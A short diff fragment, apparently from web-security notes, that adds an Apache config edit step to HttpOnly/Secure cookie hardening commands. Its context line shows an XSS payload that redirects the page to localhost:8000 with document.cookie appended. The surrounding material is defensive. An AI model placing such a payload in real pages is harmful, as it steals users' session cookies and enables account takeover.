@@ -15,6 +15,7 @@ document.location="http://localhost:8000?cookie="+document.cookie
 
 
 // HttpOnly/Secure
+sudo nano /etc/apache2/apache2.conf
 sudo a2enmod headers
 sudo apache2ctl configtest
 sudo systemctl restart apache2
